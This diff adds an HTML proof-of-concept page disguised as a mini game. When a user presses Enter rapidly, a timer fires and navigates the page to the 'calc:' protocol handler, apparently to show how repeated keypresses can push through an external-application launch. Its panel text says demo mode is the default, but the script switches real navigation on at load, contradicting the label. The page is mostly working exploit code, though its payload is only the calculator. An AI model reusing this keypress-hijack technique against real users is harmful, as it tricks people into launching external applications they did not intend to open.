@@ -1,0 +1,205 @@
+<!doctype html>
+<html lang="id">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>PoC Game UI — Enter Spam Trigger</title>
+  <style>
+    :root{
+      --bg:#0b1222;
+      --panel:#0f2133;
+      --accent:#34d399;
+      --muted:#9fb3c8;
+      --danger:#fb7185;
+    }
+    *{box-sizing:border-box}
+    body{margin:0;font-family:Inter,ui-sans-serif,system-ui,Segoe UI,Roboto,"Helvetica Neue",Arial;background:linear-gradient(180deg,#071020 0%,var(--bg) 100%);color:#e6f2fb;display:flex;align-items:center;justify-content:center;height:100vh}
+
+    .container{width:980px;max-width:96%;background:linear-gradient(180deg,rgba(255,255,255,0.02),rgba(255,255,255,0.01));border-radius:12px;padding:18px;box-shadow:0 12px 40px rgba(2,6,23,0.6);display:grid;grid-template-columns:1fr 360px;gap:16px}
+
+    /* Game area */
+    .game {background:radial-gradient(ellipse at 20% 10%, rgba(52,211,153,0.06), transparent 10%), linear-gradient(180deg, rgba(255,255,255,0.02), transparent);border-radius:8px;padding:14px;display:flex;flex-direction:column;align-items:center}
+    .game-header{width:100%;display:flex;align-items:center;justify-content:space-between;margin-bottom:8px}
+    .title{font-weight:700;font-size:18px;color:var(--accent)}
+    .controls{font-size:13px;color:var(--muted)}
+
+    .playfield{width:100%;height:420px;background:linear-gradient(180deg,#081020 0%, #07131d 100%);border-radius:8px;border:1px solid rgba(255,255,255,0.03);position:relative;overflow:hidden;display:flex;align-items:center;justify-content:center}
+
+    /* moving target */
+    .target{width:82px;height:82px;border-radius:12px;background:linear-gradient(135deg,#143a2b,#0b6b4f);display:flex;align-items:center;justify-content:center;font-weight:800;font-size:20px;box-shadow:0 8px 30px rgba(4,10,20,0.6);transition:transform 220ms cubic-bezier(.2,.9,.2,1)}
+
+    /* HUD */
+    .hud{display:flex;gap:10px;margin-top:12px}
+    .stat{background:linear-gradient(180deg,rgba(255,255,255,0.02),transparent);padding:10px;border-radius:8px;min-width:120px;text-align:center}
+    .stat .num{font-size:20px;font-weight:700;color:var(--accent)}
+    .log{margin-top:12px;background:rgba(0,0,0,0.14);padding:8px;border-radius:8px;height:120px;overflow:auto;font-family:monospace;color:var(--muted);font-size:13px}
+
+    /* right panel */
+    .panel{background:linear-gradient(180deg,rgba(255,255,255,0.01),transparent);padding:12px;border-radius:8px}
+    .section{margin-bottom:12px}
+    .section h3{margin:0 0 8px 0;font-size:14px;color:var(--muted)}
+    .btn{display:inline-block;padding:8px 12px;border-radius:8px;background:rgba(255,255,255,0.03);cursor:pointer;border:1px solid rgba(255,255,255,0.03)}
+    .toggle{display:flex;gap:8px;align-items:center}
+    .danger{color:var(--danger);font-weight:700}
+
+    footer{grid-column:1/-1;margin-top:6px;text-align:center;color:rgba(255,255,255,0.25);font-size:12px}
+
+    @media(max-width:880px){.container{grid-template-columns:1fr}.playfield{height:320px}}
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="game">
+      <div class="game-header">
+        <div class="title">PoC — Mini Game (demo)</div>
+        <div class="controls">Focus the page and press <strong>Enter</strong> rapidly to simulate spam</div>
+      </div>
+
+      <div class="playfield" id="playfield" tabindex="0">
+        <div class="target" id="target">PLAY</div>
+      </div>
+
+      <div class="hud">
+        <div class="stat">
+          <div style="font-size:12px;color:var(--muted)">Enter Count</div>
+          <div class="num" id="enterCount">0</div>
+        </div>
+        <div class="stat">
+          <div style="font-size:12px;color:var(--muted)">Timer state</div>
+          <div class="num" id="timerState">idle</div>
+        </div>
+        <div class="stat">
+          <div style="font-size:12px;color:var(--muted)">Triggered</div>
+          <div class="num" id="triggeredFlag">no</div>
+        </div>
+      </div>
+
+      <div class="log" id="log">Log: game ready\n</div>
+    </div>
+
+    <aside class="panel">
+      <div class="section">
+        <h3>PoC Parameters</h3>
+        <div style="display:flex;gap:8px;flex-wrap:wrap">
+          <label class="btn" id="btnReset">Reset PoC</label>
+          <label class="btn" id="btnFocus">Focus Playfield</label>
+        </div>
+      </div>
+
+      <div class="section">
+        <h3>Behavior</h3>
+        <div class="toggle">
+          <input type="checkbox" id="realNav" checked /> <label for="realNav">Enable real navigation to <code>ms-calculator:</code> (DANGER)</label>
+        </div>
+        <div style="margin-top:8px;color:var(--muted);font-size:13px">Default: demo mode (no real navigation). Enable only on test VM.</div>
+      </div>
+
+      <div class="section">
+        <h3>How the exploit simulates</h3>
+        <ol style="color:var(--muted);font-size:13px;margin:6px 0;padding-left:18px">
+          <li>The first Enter press sets a timer (50ms) to navigate to the protocol.</li> 
+          <li>If the user keeps spamming Enter, the timer continues running and the navigation is executed (same-page).</li>
+        </ol>
+      </div>
+
+      <div class="section">
+        
+      </div>
+    </aside>
+  </div>
+
+  <script>
+    const playfield = document.getElementById('playfield');
+    const target = document.getElementById('target');
+    const logEl = document.getElementById('log');
+    const enterCountEl = document.getElementById('enterCount');
+    const timerStateEl = document.getElementById('timerState');
+    const triggeredFlagEl = document.getElementById('triggeredFlag');
+    const realNavChk = document.getElementById('realNav');
+    const btnReset = document.getElementById('btnReset');
+    const btnFocus = document.getElementById('btnFocus');
+
+    let enterCount = 0;
+    let lastTime = 0;
+    let firstEnterTimer = null;
+    let triggered = false;
+
+    function appendLog(s) {
+      logEl.textContent += `[${new Date().toLocaleTimeString()}] ${s}\n`;
+      logEl.scrollTop = logEl.scrollHeight;
+    }
+
+    function resetPoC() {
+      enterCount = 0; lastTime = 0;
+      if (firstEnterTimer) clearTimeout(firstEnterTimer);
+      firstEnterTimer = null; triggered = false;
+      enterCountEl.textContent = '0';
+      timerStateEl.textContent = 'idle';
+      triggeredFlagEl.textContent = 'no';
+      appendLog('PoC reset.');
+      target.style.transform = 'translate(0,0) scale(1)';
+    }
+
+    btnReset.addEventListener('click', resetPoC);
+    btnFocus.addEventListener('click', () => { playfield.focus(); appendLog('Playfield focused'); });
+
+    function moveTargetRandom() {
+      const pw = playfield.clientWidth;
+      const ph = playfield.clientHeight;
+      const tw = target.clientWidth;
+      const th = target.clientHeight;
+      const x = Math.floor(Math.random() * (pw - tw)) - (pw/2 - tw/2);
+      const y = Math.floor(Math.random() * (ph - th)) - (ph/2 - th/2);
+      target.style.transform = `translate(${x}px, ${y}px) scale(${1 + Math.random() * 0.04})`;
+    }
+
+    window.addEventListener('keydown', function(e) {
+      if ((e.key === 'r' || e.key === 'R') && !e.shiftKey && !e.ctrlKey && !e.altKey) { resetPoC(); return; }
+
+      if (e.key !== 'Enter') return;
+
+      const now = Date.now();
+      if (now - lastTime > 3000) enterCount = 0;
+      lastTime = now;
+      enterCount++;
+
+      enterCountEl.textContent = enterCount.toString();
+      appendLog(`Enter pressed (count=${enterCount}) isTrusted=${e.isTrusted}`);
+
+      moveTargetRandom();
+
+      if (!triggered && enterCount === 4) {
+        triggered = true;
+        triggeredFlagEl.textContent = 'yes';
+        timerStateEl.textContent = 'Trigger(enter#4)';
+        appendLog('Trigger condition met on Enter #4 -> performing same-page navigation attempt');
+
+        target.style.transform += ' scale(1.08)';
+
+        setTimeout(() => {
+          if (realNavChk.checked) {
+            appendLog('Performing REAL navigation to calc:');
+            try { window.location = 'calc:'; } catch (err) { appendLog('Navigation error: '+err); }
+          } else {
+            appendLog('(Demo) navigation skipped. Enable real navigation in right panel to actually call protocol.');
+            const badge = document.createElement('div');
+            badge.textContent = 'TRIGGERED (demo)';
+            badge.style.position = 'absolute';
+            badge.style.left = '14px';
+            badge.style.bottom = '14px';
+            badge.style.padding = '8px 10px';
+            badge.style.borderRadius = '8px';
+            badge.style.background = 'rgba(255,255,255,0.04)';
+            badge.style.backdropFilter = 'blur(4px)';
+            playfield.appendChild(badge);
+            setTimeout(()=>badge.remove(),2000);
+          }
+        }, 50);
+      }
+
+    });
+    try { realNavChk.checked = true; appendLog('Real navigation ENABLED by default (DANGER) — use on a test VM only.'); } catch(e) { }
+    resetPoC();
+  </script>
+</body>
+</html>
